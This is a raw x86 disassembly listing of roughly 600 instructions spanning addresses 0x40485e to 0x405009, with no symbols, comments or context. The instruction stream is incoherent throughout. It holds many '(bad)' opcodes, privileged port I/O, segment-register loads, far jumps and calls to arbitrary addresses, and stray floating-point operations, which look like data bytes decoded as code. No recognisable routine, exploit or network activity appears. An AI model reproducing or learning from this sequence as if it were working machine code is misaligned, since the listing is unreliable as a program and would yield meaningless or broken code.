  40485e:	sub    BYTE PTR [eax-0x6b],bh
  404861:	fs dec ecx
  404863:	mov    ds:0x87fcfd58,eax
  404868:	xchg   BYTE PTR [ebx+0x17],ch
  40486b:	hlt    
  40486c:	push   ds
  40486d:	pop    ecx
  40486e:	sbb    dl,ch
  404870:	lock inc esi
  404873:	mov    dl,0x99
  404875:	(bad)  
  404876:	and    BYTE PTR [eax],dl
  404878:	or     eax,0xd23b5100
  40487d:	mov    al,ds:0x364b3bb6
  404882:	sbb    eax,0xb851065d
  404887:	jge    0x40483a
  404889:	mov    dl,0x28
  40488b:	xchg   edi,eax
  40488c:	icebp  
  40488d:	inc    eax
  40488e:	int    0x3d
  404890:	cld    
  404891:	cld    
  404892:	das    
  404893:	pop    ss
  404894:	call   0xc773526
  404899:	clc    
  40489a:	inc    ebx
  40489b:	loope  0x4048d3
  40489d:	sbb    DWORD PTR [ebp-0xe],0xa5a6e3a6
  4048a4:	and    eax,0x1b070f8d
  4048a9:	jns    0x40483c
  4048ab:	out    0xac,al
  4048ad:	cmp    eax,0xcaad1494
  4048b2:	dec    esi
  4048b3:	fdivr  DWORD PTR [ebx+0x5a]
  4048b6:	daa    
  4048b7:	fdivr  QWORD PTR [eax-0x18c6a2a1]
  4048bd:	xor    ch,BYTE PTR [esi-0x23]
  4048c0:	lods   eax,DWORD PTR ds:[esi]
  4048c1:	adc    dh,dh
  4048c3:	gs mov cl,0x22
  4048c6:	test   DWORD PTR [eax],esi
  4048c8:	cmp    esp,DWORD PTR [edi]
  4048ca:	retf   
  4048cb:	lea    ebp,[ebp-0x7d83bea1]
  4048d1:	xchg   DWORD PTR [esi+0x5ab4ae85],edi
  4048d7:	push   0xc4b64096
  4048dc:	jg     0x40490c
  4048de:	xchg   esi,eax
  4048df:	ret    0x1419
  4048e2:	imul   eax,DWORD PTR [esi+eax*4],0x10b0467f
  4048e9:	jae    0x4048b4
  4048eb:	retf   
  4048ec:	leave  
  4048ed:	push   edx
  4048ee:	idiv   edi
  4048f0:	xchg   edi,eax
  4048f1:	add    eax,0xed50776d
  4048f6:	sub    eax,0x834d84ea
  4048fb:	pop    esi
  4048fc:	add    ch,ch
  4048fe:	hlt    
  4048ff:	pop    esp
  404900:	mov    ecx,0x9e17a2ca
  404905:	retf   
  404906:	inc    ecx
  404907:	ins    BYTE PTR es:[edi],dx
  404908:	pop    ss
  404909:	repz jns 0x40496a
  40490c:	pminsw mm6,QWORD PTR [esi]
  40490f:	cmp    BYTE PTR [edx+0x54],cl
  404912:	mov    dh,0x30
  404914:	jbe    0x4048b8
  404916:	or     DWORD PTR [edi+0x5ff51975],ecx
  40491c:	xlat   BYTE PTR ds:[ebx]
  40491d:	jb     0x40491e
  40491f:	add    al,0x7c
  404921:	ret    
  404922:	(bad)  
  404923:	and    BYTE PTR [edx-0x2884e73b],dh
  404929:	jle    0x4048e8
  40492b:	and    al,0x39
  40492d:	dec    ebx
  40492e:	enter  0x8d11,0xdb
  404932:	mov    ah,0x14
  404934:	mov    al,ds:0xdb2d7c85
  404939:	sbb    al,0xc4
  40493b:	es pop esp
  40493d:	jo     0x4048ee
  40493f:	jae    0x4048d9
  404941:	loope  0x404980
  404943:	mov    bl,0x4f
  404945:	fidiv  WORD PTR [ebx]
  404947:	cwde   
  404948:	xchg   esp,eax
  404949:	mov    bh,0x43
  40494b:	fs iret 
  40494d:	xor    eax,0xad1acd42
  404952:	mov    bl,0x43
  404954:	push   ebx
  404955:	push   ebp
  404956:	mov    ecx,0xe1a76880
  40495b:	and    ebp,edi
  40495d:	sbb    BYTE PTR [ecx-0x3f443291],al
  404963:	inc    eax
  404964:	ja     0x4048f2
  404966:	scas   al,BYTE PTR es:[edi]
  404967:	adc    eax,0xaed3baf8
  40496c:	in     eax,0x1d
  40496e:	push   ss
  40496f:	adc    BYTE PTR [ebx+ebp*4+0x77d0b213],bl
  404976:	inc    eax
  404977:	rcr    BYTE PTR [ebp+0x31],1
  40497a:	mov    eax,cs:0xa7e299f7
  404980:	lods   eax,DWORD PTR gs:[esi]
  404982:	fld    QWORD PTR [esi-0x6b]
  404985:	push   ebx
  404986:	les    esp,FWORD PTR [edx-0x6a]
  404989:	popa   
  40498a:	imul   ebp,esi,0xffffffbc
  40498d:	mov    WORD PTR [ebp-0x498bd822],?
  404993:	dec    ebx
  404994:	pop    edx
  404995:	mov    gs,WORD PTR [ebx+0x0]
  404998:	adc    al,0x8d
  40499a:	jecxz  0x404a02
  40499c:	(bad)  
  40499d:	lods   al,BYTE PTR ds:[esi]
  40499e:	pop    ebx
  40499f:	adc    al,0x83
  4049a1:	imul   BYTE PTR [ebp+edx*4-0x285e4589]
  4049a8:	jmp    0xafe2:0xdae4ae72
  4049af:	fidivr DWORD PTR ds:0x3514c3f2
  4049b5:	mov    ch,0xbd
  4049b7:	mov    cl,0x82
  4049b9:	push   0xffffffe5
  4049bb:	push   ds
  4049bc:	call   0x880787c9
  4049c1:	cs inc eax
  4049c3:	and    BYTE PTR [ecx-0x1a],cl
  4049c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049c7:	dec    eax
  4049c8:	(bad)  
  4049c9:	jo     0x4049c6
  4049cb:	les    esp,FWORD PTR [ebx-0x4cd0c580]
  4049d1:	out    dx,eax
  4049d2:	cs ins BYTE PTR es:[edi],dx
  4049d4:	inc    esp
  4049d5:	add    BYTE PTR [ecx+0x1d],ch
  4049d8:	mov    ah,0xe9
  4049da:	das    
  4049db:	add    al,0xe9
  4049dd:	fnstcw WORD PTR [eax-0x6e]
  4049e0:	sub    eax,0x843f409d
  4049e5:	cs inc ebx
  4049e7:	clc    
  4049e8:	daa    
  4049e9:	std    
  4049ea:	jecxz  0x4049d3
  4049ec:	out    0x89,eax
  4049ee:	mov    dl,0x92
  4049f0:	adc    al,0x46
  4049f2:	push   ss
  4049f3:	pop    esp
  4049f4:	xchg   BYTE PTR [ebp+0xd],dl
  4049f7:	(bad)  
  4049f8:	cli    
  4049f9:	xchg   ecx,eax
  4049fa:	or     eax,0xab522c3e
  4049ff:	out    dx,eax
  404a00:	add    DWORD PTR ds:0x85a64dd2,esi
  404a06:	xchg   BYTE PTR [ecx],bl
  404a08:	addr16 dec ecx
  404a0a:	ds sti 
  404a0c:	pushf  
  404a0d:	fwait
  404a0e:	inc    edx
  404a0f:	repnz inc eax
  404a11:	pop    esp
  404a12:	mov    gs:0x5f778a96,al
  404a18:	mov    ss,WORD PTR [edx-0x47dd2275]
  404a1e:	or     cl,ch
  404a20:	push   0x1f5a2ac3
  404a25:	sub    ebp,DWORD PTR [edx+0x15]
  404a28:	fwait
  404a29:	cmp    DWORD PTR [ebx-0x6840bb4e],esi
  404a2f:	dec    edi
  404a30:	and    BYTE PTR [eax],cl
  404a32:	jl     0x4049dc
  404a34:	cld    
  404a35:	(bad)  
  404a36:	xor    ecx,DWORD PTR [ebp+0x55]
  404a39:	lahf   
  404a3a:	(bad)  [edx-0x18289280]
  404a40:	xchg   ebx,eax
  404a41:	fcomp  DWORD PTR [ebp+0x545a5e32]
  404a47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a48:	push   ecx
  404a49:	aad    0x22
  404a4b:	sub    BYTE PTR [ecx-0x7f],dl
  404a4e:	retf   0x68be
  404a51:	pop    ss
  404a52:	add    ebp,DWORD PTR [ecx-0x46]
  404a55:	sar    DWORD PTR [edx-0x93fcf22],cl
  404a5b:	popa   
  404a5c:	stc    
  404a5d:	data16 fdivr st(1),st
  404a60:	test   BYTE PTR [ebp+0x62],bh
  404a63:	(bad)  
  404a64:	icebp  
  404a65:	inc    eax
  404a67:	xchg   ebp,eax
  404a68:	add    al,0x1e
  404a6a:	nop
  404a6b:	int3   
  404a6c:	gs (bad) 
  404a6e:	fcos   
  404a70:	pop    ebx
  404a71:	mov    ecx,0x90c4a11b
  404a76:	or     BYTE PTR [edx+ebx*8-0x3],dh
  404a7a:	out    0x2,eax
  404a7c:	mov    ah,0x9
  404a7e:	out    dx,al
  404a7f:	fst    QWORD PTR [ebp+0x4f]
  404a82:	sbb    al,0xaa
  404a84:	mov    ch,0x1e
  404a86:	mov    ebx,0x4872d328
  404a8b:	iret   
  404a8c:	jns    0x404a68
  404a8e:	mov    ch,bh
  404a90:	push   edi
  404a91:	(bad)  
  404a92:	scas   eax,DWORD PTR es:[edi]
  404a93:	sahf   
  404a94:	push   0xffffffa6
  404a96:	jmp    0xb54a:0x6e26af19
  404a9d:	inc    esi
  404a9e:	or     cl,BYTE PTR cs:[ebx]
  404aa1:	cmp    al,0xf4
  404aa3:	inc    ebp
  404aa4:	jmp    0xe31:0xf758a292
  404aab:	in     eax,dx
  404aac:	add    BYTE PTR [eax],al
  404aae:	inc    esp
  404aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ab0:	arpl   bx,cx
  404ab2:	lods   al,BYTE PTR ds:[esi]
  404ab3:	xor    DWORD PTR [ebp+0x37ec33a9],edi
  404ab9:	out    0x5f,al
  404abb:	cmp    eax,0xb7839b9a
  404ac0:	sub    al,0x70
  404ac2:	lds    edx,FWORD PTR [edx]
  404ac4:	dec    edi
  404ac5:	mov    bl,0x3a
  404ac7:	and    al,BYTE PTR [edx]
  404ac9:	mov    edi,0x3205bfb5
  404ace:	adc    esi,ecx
  404ad0:	sbb    al,0x8b
  404ad2:	imul   esp
  404ad4:	ja     0x404af8
  404ad6:	jno    0x404a81
  404ad8:	test   al,0x76
  404ada:	pop    edx
  404adb:	and    eax,ecx
  404add:	loopne 0x404b3e
  404adf:	mov    dl,BYTE PTR [eax]
  404ae1:	adc    eax,DWORD PTR [ebp+0x32]
  404ae4:	xchg   edx,eax
  404ae5:	int3   
  404ae6:	dec    esp
  404ae7:	push   cs
  404ae8:	fstp   QWORD PTR [esi*1+0x6718a0cd]
  404aef:	mov    al,ds:0xfc762a6c
  404af4:	inc    esi
  404af5:	add    edx,eax
  404af7:	fadd   DWORD PTR [ecx-0x7f]
  404afa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404afb:	fdivr  DWORD PTR [ebx+0x4d]
  404afe:	leave  
  404aff:	sub    eax,0x55afadc1
  404b04:	xchg   esp,eax
  404b05:	xor    edi,ecx
  404b07:	ins    DWORD PTR es:[edi],dx
  404b08:	adc    BYTE PTR [ebx],bh
  404b0a:	or     eax,0x4fd2aa3f
  404b0f:	cmp    BYTE PTR [eax],dh
  404b11:	xor    edi,DWORD PTR ds:0x53248c73
  404b17:	jp     0x404af4
  404b19:	mov    dl,0xb0
  404b1b:	pushf  
  404b1c:	sbb    al,0xe4
  404b1e:	pop    ss
  404b1f:	jmp    0xcd899fff
  404b24:	lahf   
  404b25:	and    bl,ch
  404b27:	jmp    0x225b:0x44525076
  404b2e:	jmp    0xdd31:0x384ce6e9
  404b35:	sahf   
  404b36:	mov    ch,0x80
  404b38:	jno    0x404b23
  404b3a:	test   eax,0xe7ec633a
  404b3f:	pusha  
  404b40:	and    dh,BYTE PTR [ebp-0x5a]
  404b43:	adc    eax,0x39d3e26a
  404b48:	xor    bl,BYTE PTR [edx+edi*8+0x19aafda8]
  404b4f:	or     DWORD PTR [edx],edx
  404b51:	jecxz  0x404b6f
  404b53:	push   ebp
  404b54:	shr    BYTE PTR [ecx],cl
  404b56:	(bad)  
  404b57:	in     al,0x23
  404b59:	clc    
  404b5a:	outs   dx,BYTE PTR ds:[esi]
  404b5b:	pop    edi
  404b5c:	fiadd  WORD PTR [edx+0x6d760073]
  404b62:	fidiv  DWORD PTR [ebx-0x76]
  404b66:	mov    ah,0x26
  404b68:	dec    ecx
  404b69:	mov    DWORD PTR [ebx+ebx*4-0x5c7b16a2],esp
  404b70:	push   0xb2eee7c7
  404b75:	scas   al,BYTE PTR es:[edi]
  404b76:	div    BYTE PTR [ecx]
  404b78:	cmp    esp,DWORD PTR [edx+ebx*1-0x68c7a0cc]
  404b7f:	push   es
  404b80:	mov    esp,0xf0b0b92d
  404b85:	fdiv   DWORD PTR [ebx+0x4995bc77]
  404b8b:	pop    edi
  404b8c:	je     0x404b61
  404b8e:	xor    eax,0x1beb3e43
  404b93:	fs test eax,0x2e740d35
  404b99:	xor    DWORD PTR [esi+ebp*8+0x69ec88a6],eax
  404ba0:	ds scas al,BYTE PTR es:[edi]
  404ba2:	fcom   st(7)
  404ba4:	or     BYTE PTR [esi+esi*8],0x68
  404ba8:	xchg   BYTE PTR [ecx-0x59],bh
  404bab:	sbb    cl,BYTE PTR [edi]
  404bad:	aaa    
  404bae:	xor    BYTE PTR [eax+0x69921e08],dl
  404bb4:	hlt    
  404bb5:	push   eax
  404bb6:	jecxz  0x404ba1
  404bb8:	popf   
  404bb9:	pop    edx
  404bba:	fsubr  QWORD PTR [ebp+0xc]
  404bbd:	push   cs
  404bbe:	test   ah,0x61
  404bc1:	outs   dx,DWORD PTR ds:[esi]
  404bc2:	cmp    edx,esi
  404bc4:	pop    ss
  404bc5:	lea    edi,[ebx+edx*1-0x2c]
  404bc9:	data16 mov dh,0x9f
  404bcc:	dec    edx
  404bcd:	mov    ecx,0x398312fb
  404bd2:	inc    esp
  404bd3:	fcomp  DWORD PTR [ebp+0x5f]
  404bd6:	jge    0x404bca
  404bd8:	xor    al,0x9
  404bda:	dec    edi
  404bdb:	push   edx
  404bdc:	in     eax,0xca
  404bde:	cld    
  404bdf:	cli    
  404be0:	ror    DWORD PTR [edx+0x40],0x8a
  404be4:	daa    
  404be5:	cmc    
  404be6:	sub    DWORD PTR [edi+ebp*2+0x37],edx
  404bea:	repz jmp 0x9df1:0x6fc3239b
  404bf2:	or     esp,DWORD PTR [edx-0x70507814]
  404bf8:	stos   BYTE PTR es:[edi],al
  404bf9:	sbb    esp,eax
  404bfb:	mov    ebp,0x1fec4451
  404c00:	sbb    dl,BYTE PTR [ebp-0x44f8b4bb]
  404c06:	sub    cl,al
  404c08:	arpl   sp,si
  404c0a:	sub    ch,BYTE PTR [esi-0x2]
  404c0d:	outs   dx,BYTE PTR ds:[esi]
  404c0e:	das    
  404c0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c10:	fnstenv [ebx]
  404c12:	fsubp  st(1),st
  404c14:	sbb    ah,BYTE PTR [ecx+0x27]
  404c17:	push   es
  404c18:	xchg   BYTE PTR [ebp-0x5cbcaec8],dh
  404c1e:	cmp    eax,0x6d6ece12
  404c23:	bound  ebx,QWORD PTR gs:[ebp-0x1f]
  404c27:	inc    eax
  404c28:	jmp    0x404bc8
  404c2a:	ds call 0xd63e:0xcc3ea1a
  404c32:	andnps xmm2,xmm0
  404c35:	in     eax,0xc7
  404c37:	cmp    al,0x25
  404c39:	ret    0x91a6
  404c3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c3d:	pop    ss
  404c3e:	jge    0x404cb4
  404c40:	push   eax
  404c41:	xchg   ebp,eax
  404c42:	jae    0x404be8
  404c44:	repz cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  404c47:	idiv   DWORD PTR gs:[eax]
  404c4a:	leave  
  404c4b:	test   BYTE PTR [eax+eiz*4],0xd2
  404c4f:	div    edx
  404c51:	mov    al,0xcb
  404c53:	cmc    
  404c54:	jge    0x404be5
  404c56:	mov    eax,ds:0xbc73c1c
  404c5b:	sub    dh,cl
  404c5d:	mov    fs,WORD PTR ss:[eax-0x274cc8db]
  404c64:	add    dh,BYTE PTR ds:0x62a28f53
  404c6a:	push   ebp
  404c6b:	sbb    BYTE PTR [ecx],ah
  404c6d:	int    0x78
  404c6f:	sbb    BYTE PTR [esi],ah
  404c71:	xchg   ecx,eax
  404c72:	shl    DWORD PTR [ecx-0x74],0x5c
  404c76:	adc    esi,0x8ef3f646
  404c7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c7d:	scas   al,BYTE PTR es:[edi]
  404c7e:	jmp    0x404c5a
  404c80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c81:	mul    DWORD PTR [edi-0x1403cd17]
  404c87:	mov    al,0x8d
  404c89:	and    eax,0xc3712846
  404c8e:	int3   
  404c8f:	inc    edi
  404c90:	test   eax,0x5572c0e
  404c95:	sbb    ecx,esi
  404c97:	sbb    BYTE PTR [ebp+0x4ac204cc],0xdf
  404c9e:	sti    
  404c9f:	mov    ebx,DWORD PTR [ebx+edi*2+0x49d26ba5]
  404ca6:	ss jne 0x404ca4
  404ca9:	loopne 0x404c8d
  404cab:	sbb    bl,al
  404cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cae:	xor    BYTE PTR [edi-0x9286b61],ch
  404cb4:	(bad)  
  404cb6:	fmul   QWORD PTR [eax-0x49]
  404cb9:	mov    dl,0xd6
  404cbb:	pop    esp
  404cbc:	jle    0x404d0a
  404cbe:	nop
  404cbf:	sbb    bh,al
  404cc1:	ret    
  404cc2:	imul   ecx,DWORD PTR ds:0x820815ca,0x2e
  404cc9:	std    
  404cca:	shl    DWORD PTR [esi+esi*1],cl
  404ccd:	push   ds
  404cce:	fs pop esp
  404cd0:	data16 sbb al,0x97
  404cd3:	sub    al,0xf5
  404cd5:	dec    ecx
  404cd6:	dec    ebx
  404cd7:	sub    edi,ebp
  404cd9:	fimul  DWORD PTR [esi+0x47ebf8fb]
  404cdf:	dec    edx
  404ce0:	push   0xffffffed
  404ce2:	cs enter 0x4cc3,0xfe
  404ce7:	cld    
  404ce8:	push   es
  404ce9:	mov    bh,0x64
  404ceb:	ins    DWORD PTR es:[edi],dx
  404cec:	dec    edx
  404ced:	in     eax,0x40
  404cef:	call   0x278f:0x1e839262
  404cf6:	rol    DWORD PTR [ecx],cl
  404cf8:	pop    ds
  404cf9:	mov    dl,0xd9
  404cfb:	jp     0x404ce2
  404cfd:	add    al,ch
  404cff:	sub    eax,0x3d9c07a6
  404d04:	addr16 push eax
  404d06:	sahf   
  404d07:	bound  esi,QWORD PTR [esp+ecx*2+0x73]
  404d0b:	xchg   ecx,eax
  404d0c:	ret    0x39e9
  404d0f:	mov    cl,0xea
  404d11:	hlt    
  404d12:	stos   DWORD PTR es:[edi],eax
  404d13:	in     al,dx
  404d14:	shl    BYTE PTR [edx-0x868fe41],0xd0
  404d1b:	fild   QWORD PTR [esi-0x40]
  404d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d1f:	mov    ebp,0xcf9381a4
  404d24:	hlt    
  404d25:	xchg   esi,eax
  404d26:	mov    dl,0xe6
  404d28:	(bad)  
  404d2a:	add    al,0xf1
  404d2c:	xchg   ebp,eax
  404d2d:	sub    al,0x1a
  404d2f:	xchg   esi,eax
  404d30:	pop    ecx
  404d31:	inc    eax
  404d32:	push   ebp
  404d33:	jnp    0x404da1
  404d35:	ja     0x404db4
  404d37:	fnstsw WORD PTR [edx-0x49]
  404d3a:	ror    DWORD PTR [ebx+0x349b440d],0xb8
  404d41:	lods   eax,DWORD PTR ds:[esi]
  404d42:	and    al,0xe
  404d44:	ror    DWORD PTR [eax+0x47],1
  404d47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d48:	aaa    
  404d49:	ret    0x89cd
  404d4c:	imul   ebp,DWORD PTR [edi+0x5a],0x22
  404d50:	xor    ah,BYTE PTR [ecx+0x5936e740]
  404d56:	jp     0x404d2c
  404d58:	test   eax,0x399d12ee
  404d5d:	pop    esi
  404d5e:	jno    0x404d4c
  404d60:	daa    
  404d61:	push   ebp
  404d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d63:	mov    al,0x13
  404d65:	jno    0x404d32
  404d67:	sti    
  404d68:	outs   dx,DWORD PTR ds:[esi]
  404d69:	iret   
  404d6a:	ret    
  404d6b:	daa    
  404d6c:	and    al,0xf2
  404d6e:	or     al,0x1f
  404d70:	xchg   edx,eax
  404d71:	xor    bh,0x9e
  404d74:	and    BYTE PTR [esi],dh
  404d76:	fwait
  404d77:	cli    
  404d78:	xor    DWORD PTR [edi+edx*2],esp
  404d7b:	nop
  404d7c:	xchg   ebx,eax
  404d7d:	xchg   DWORD PTR [ebx],ebp
  404d7f:	jle    0x404d21
  404d81:	mov    DWORD PTR [ecx+0x5e9a2b0b],0xd001c9fe
  404d8b:	push   es
  404d8c:	loope  0x404d8c
  404d8e:	xlat   BYTE PTR ds:[ebx]
  404d8f:	ins    BYTE PTR es:[edi],dx
  404d90:	push   edi
  404d91:	nop
  404d92:	add    DWORD PTR [eax],esp
  404d94:	nop
  404d95:	jo     0x404d8e
  404d97:	or     DWORD PTR [edx-0x30bbde00],esi
  404d9d:	iret   
  404d9e:	imul   esi,ebp,0x81c63415
  404da4:	adc    al,0x67
  404da6:	repnz imul ebp,ebx,0x65a9c680
  404dad:	mov    al,0xce
  404daf:	lock ss ja 0x404dc8
  404db3:	dec    esi
  404db4:	neg    DWORD PTR [ebp+0x70]
  404db7:	popf   
  404db8:	enter  0xd0bb,0x3c
  404dbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dbe:	cmp    eax,0x3aed4108
  404dc3:	push   ebx
  404dc4:	jle    0x404e39
  404dc6:	lea    edx,[eax]
  404dc8:	jb     0x404dd9
  404dca:	ja     0x404db3
  404dcc:	jp     0x404d64
  404dce:	lods   al,BYTE PTR ds:[esi]
  404dcf:	out    dx,eax
  404dd0:	push   ebx
  404dd1:	pusha  
  404dd2:	scas   al,BYTE PTR es:[edi]
  404dd3:	sbb    dh,ah
  404dd5:	add    al,dl
  404dd7:	cmp    BYTE PTR [ebx],dh
  404dd9:	push   eax
  404dda:	loop   0x404df7
  404ddc:	shl    DWORD PTR [eax+0x67344bcd],0x9d
  404de3:	out    dx,eax
  404de4:	xor    al,0x11
  404de6:	out    0xf2,al
  404de8:	and    eax,0x67275705
  404ded:	test   eax,0x2fcb373a
  404df2:	push   ecx
  404df3:	fild   QWORD PTR [edi+0x7cebd4b7]
  404df9:	sbb    edi,esp
  404dfb:	jl     0x404dd6
  404dfd:	bound  ebp,QWORD PTR [eax-0x23]
  404e00:	mov    bh,0x2a
  404e02:	xchg   esp,eax
  404e03:	js     0x404e1f
  404e05:	mov    cs,edx
  404e07:	je     0x404e58
  404e09:	inc    DWORD PTR [eax]
  404e0b:	jecxz  0x404dad
  404e0d:	and    ebp,DWORD PTR [edx]
  404e0f:	jle    0x404e61
  404e11:	ja     0x404d94
  404e13:	inc    BYTE PTR ds:0xcfa6658c
  404e19:	retf   
  404e1a:	dec    ecx
  404e1b:	xor    BYTE PTR [eax-0x67e28a51],0x0
  404e22:	add    al,0xcd
  404e24:	push   esp
  404e25:	xchg   edi,eax
  404e26:	dec    edi
  404e27:	shl    DWORD PTR [ebx+0x31c9fc55],1
  404e2d:	imul   ebp,DWORD PTR cs:[esi],0x9fc694ac
  404e34:	and    al,0x99
  404e36:	stos   DWORD PTR es:[edi],eax
  404e37:	sub    al,0x78
  404e39:	test   al,0x71
  404e3b:	push   edi
  404e3c:	(bad)  
  404e3d:	sahf   
  404e3e:	mov    BYTE PTR [ebp+0x238e4c58],dh
  404e44:	sbb    dl,cl
  404e46:	pop    esp
  404e47:	lea    edx,[edi+0x7d3c2257]
  404e4d:	mov    ebp,0x2f08fa2d
  404e52:	mov    WORD PTR [eax+0x4583a8f4],?
  404e58:	xor    dh,BYTE PTR [eax]
  404e5a:	push   ecx
  404e5b:	ins    BYTE PTR es:[edi],dx
  404e5c:	clc    
  404e5d:	or     esi,DWORD PTR [ebx]
  404e5f:	call   0xde46caba
  404e64:	jbe    0x404e30
  404e66:	mov    edi,0x43e9cd70
  404e6b:	cs dec ebx
  404e6d:	dec    edx
  404e6e:	jmp    0x404e85
  404e70:	fmul   DWORD PTR [edi-0x7abe5006]
  404e76:	dec    ecx
  404e77:	mov    BYTE PTR [ecx+0x65101165],al
  404e7d:	je     0x404ebe
  404e7f:	or     edi,edx
  404e81:	sar    BYTE PTR [edx+0x3],0xa4
  404e85:	push   ss
  404e86:	cmp    BYTE PTR [edi],dl
  404e88:	mov    ebp,0x542f61dd
  404e8d:	mov    ebp,0x89f941d3
  404e92:	add    eax,0x470b67a6
  404e97:	cmp    cl,ah
  404e99:	das    
  404e9a:	cwde   
  404e9b:	popa   
  404e9c:	retf   0xd1ae
  404e9f:	sub    ch,al
  404ea1:	mov    cs,ebx
  404ea3:	repnz in al,0x94
  404ea6:	cmc    
  404ea7:	and    BYTE PTR [ebx-0x7d],ch
  404eaa:	(bad)  
  404eab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eac:	int    0xce
  404eae:	lods   eax,DWORD PTR ds:[esi]
  404eaf:	pop    ebp
  404eb0:	xchg   ebp,eax
  404eb1:	popa   
  404eb2:	sub    ebx,DWORD PTR [edi+0x4e2d2d17]
  404eb8:	mov    ecx,0x90024396
  404ebd:	sbb    ebx,DWORD PTR [esi]
  404ebf:	data16 mov ah,0x2f
  404ec2:	mov    al,BYTE PTR [edx-0x1ebf35bc]
  404ec8:	ds add eax,0x9aea1f18
  404ece:	mov    esi,0xa6bd1575
  404ed3:	dec    ebp
  404ed4:	mov    edx,0x5048087d
  404ed9:	aas    
  404eda:	sub    DWORD PTR ds:0x1af1e6fd,esp
  404ee0:	jg     0x404f4b
  404ee2:	cmp    BYTE PTR [edx-0x12],dl
  404ee5:	gs push ebx
  404ee7:	dec    edx
  404ee8:	sahf   
  404ee9:	(bad)  
  404eea:	pusha  
  404eeb:	cmc    
  404eec:	cmp    ch,BYTE PTR [edx+0x987405]
  404ef2:	(bad)  [ebp+ecx*2+0x14]
  404ef6:	jae    0x404e8b
  404ef8:	xchg   ecx,eax
  404ef9:	push   ecx
  404efa:	clc    
  404efb:	sar    al,1
  404efd:	leave  
  404efe:	das    
  404eff:	ins    BYTE PTR es:[edi],dx
  404f00:	jbe    0x404f3c
  404f02:	push   edx
  404f03:	mov    ch,0x22
  404f05:	mov    esi,0x8482fc8d
  404f0a:	push   esp
  404f0b:	sub    BYTE PTR [edi-0x6f6be6e8],dl
  404f11:	fs repz dec edi
  404f14:	push   eax
  404f15:	iret   
  404f16:	push   esi
  404f17:	mov    BYTE PTR [edi],al
  404f19:	push   ecx
  404f1a:	add    ebx,ecx
  404f1c:	mov    dl,0xa
  404f1e:	inc    ecx
  404f1f:	ret    
  404f20:	gs test al,0x15
  404f23:	mov    bh,0xd8
  404f25:	imul   edi,eax,0xffffffa4
  404f28:	repnz jmp 0x76e0:0x39aad0de
  404f30:	fild   WORD PTR [eax+0x2b0b4b42]
  404f36:	jecxz  0x404f08
  404f38:	mov    dl,0x8e
  404f3a:	icebp  
  404f3b:	add    ah,dh
  404f3d:	(bad)  
  404f3f:	xchg   ebp,eax
  404f40:	outs   dx,DWORD PTR ds:[esi]
  404f41:	and    DWORD PTR [ebx+esi*1+0x555ee92f],eax
  404f48:	(bad)
  404f4b:	mov    ebx,0x9a5e0d6e
  404f50:	ss mov esp,0xe2ef0753
  404f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f57:	cmp    eax,0xe2b8a80c
  404f5c:	mov    al,ds:0x33bed9dd
  404f61:	daa    
  404f62:	push   ss
  404f63:	aas    
  404f64:	daa    
  404f65:	popf   
  404f66:	inc    esp
  404f67:	dec    edi
  404f68:	pop    es
  404f69:	outs   dx,DWORD PTR ds:[esi]
  404f6a:	mov    eax,ds:0x8dcea986
  404f6f:	ret    0x9920
  404f72:	leave  
  404f73:	xchg   ebx,eax
  404f74:	xor    DWORD PTR [ebx+0x24a02664],ebx
  404f7a:	(bad)  
  404f7b:	repz es xchg ecx,eax
  404f7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f7f:	adc    al,0xe
  404f81:	fidiv  DWORD PTR [ebx+0x1b]
  404f84:	mov    dl,0xb2
  404f86:	aaa    
  404f87:	mov    eax,0x4221fe52
  404f8c:	(bad)  
  404f8d:	les    eax,FWORD PTR [ecx-0x20]
  404f90:	cmp    al,0x9
  404f92:	test   DWORD PTR [esi-0x5bcddcba],ebp
  404f98:	or     ebx,DWORD PTR [edx]
  404f9a:	jne    0x404fdb
  404f9c:	shl    ch,cl
  404f9e:	stc    
  404f9f:	push   ss
  404fa0:	fst    DWORD PTR [esi+0x34]
  404fa3:	sub    al,0xdc
  404fa5:	pushf  
  404fa6:	fwait
  404fa7:	add    esp,DWORD PTR [eax-0x52d062be]
  404fad:	xor    dl,BYTE PTR [eax+0x97b6265]
  404fb3:	mov    ebp,0x84656b76
  404fb8:	inc    ebx
  404fb9:	fwait
  404fba:	jecxz  0x404f68
  404fbc:	adc    BYTE PTR [edx+0x18],dh
  404fbf:	mov    ch,0x44
  404fc1:	aaa    
  404fc2:	xor    BYTE PTR [eax+0x6f6b64c2],bl
  404fc8:	and    esp,DWORD PTR [eax]
  404fca:	mov    ah,0x71
  404fcc:	jg     0xae40a1cc
  404fd2:	inc    esp
  404fd3:	jo     0x404ff8
  404fd5:	add    esi,ecx
  404fd7:	adc    esp,DWORD PTR [ecx-0x283d3a8b]
  404fdd:	xchg   edx,eax
  404fde:	jae    0x404fa9
  404fe0:	dec    ecx
  404fe1:	cwde   
  404fe2:	mov    dh,0x3a
  404fe4:	mov    esi,0x5d9d8dae
  404fe9:	call   0x2c73:0x1c4e3c2
  404ff0:	cmp    esp,eax
  404ff2:	arpl   WORD PTR [eax-0x21],si
  404ff5:	mov    bl,0xc5
  404ff7:	fistp  QWORD PTR [edx]
  404ff9:	xchg   BYTE PTR [ecx-0x5078abaf],al
  404fff:	mov    bl,0x5d
  405001:	mov    bl,0xae
  405003:	adc    BYTE PTR [ecx+0x57b41a9c],ch
  405009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
